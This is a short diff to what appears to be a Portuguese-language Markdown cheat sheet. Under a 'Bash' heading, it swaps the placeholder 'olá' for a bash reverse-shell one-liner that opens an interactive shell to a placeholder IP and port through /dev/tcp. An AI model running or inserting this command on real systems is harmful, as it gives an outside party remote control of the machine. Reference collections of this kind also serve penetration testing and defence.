@@ -3,5 +3,5 @@
 ### Bash
 interpretador de comandos simples
 ```
-olá
+bash -i >& /dev/tcp/[IP]/[Porta] 0>&1
 ```
